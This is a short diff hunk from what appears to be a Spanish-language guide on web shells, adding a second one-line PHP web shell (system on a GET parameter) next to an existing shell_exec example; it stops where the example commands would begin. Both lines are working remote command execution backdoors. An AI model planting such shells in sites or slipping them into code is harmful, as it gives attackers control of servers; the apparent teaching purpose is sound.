@@ -87,7 +87,9 @@ Ejemplo de Web Shell con comando remoto:
 ```php
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
-
+```php
+<?php system($_GET['cmd']); ?>
+```
 Esto permitiría ejecutar comandos como:
 
 ```
